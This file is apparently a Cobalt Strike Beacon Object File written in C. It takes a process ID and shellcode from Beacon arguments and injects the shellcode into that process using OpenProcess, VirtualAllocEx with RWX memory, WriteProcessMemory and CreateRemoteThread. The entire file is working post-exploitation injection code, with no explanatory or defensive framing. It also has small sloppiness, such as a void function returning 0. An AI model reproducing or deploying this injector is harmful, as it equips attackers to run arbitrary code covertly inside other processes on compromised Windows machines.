#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(
    DWORD dwDesiredAccess, 
    WINBOOL bInheritHandle, 
    DWORD dwProcessId);

DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (  
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten);

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread (
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

void Inject(DWORD pid, unsigned char * shellcode, SIZE_T shellcode_len) {
    HANDLE      pHandle;
    HANDLE      rThread;
    PVOID       rBuffer;
    WINBOOL     check;
    SIZE_T  allocation_size;    
    allocation_size = shellcode_len + 1;

    pHandle     =      KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    rBuffer     =      KERNEL32$VirtualAllocEx(pHandle, NULL, allocation_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    check       =      KERNEL32$WriteProcessMemory(pHandle, rBuffer, shellcode, allocation_size, NULL);
    rThread     =      KERNEL32$CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
    
    KERNEL32$CloseHandle(pHandle);

    return 0;
}

void go(char * args, int len) {
    datap parser;
    DWORD pid;

    unsigned char * shellcode;
    SIZE_T shellcode_len;

    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);
    shellcode_len = BeaconDataLength(&parser);
    shellcode = BeaconDataExtract(&parser, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode Size: %d bytes", shellcode_len);
    Inject(pid,shellcode,shellcode_len);
}
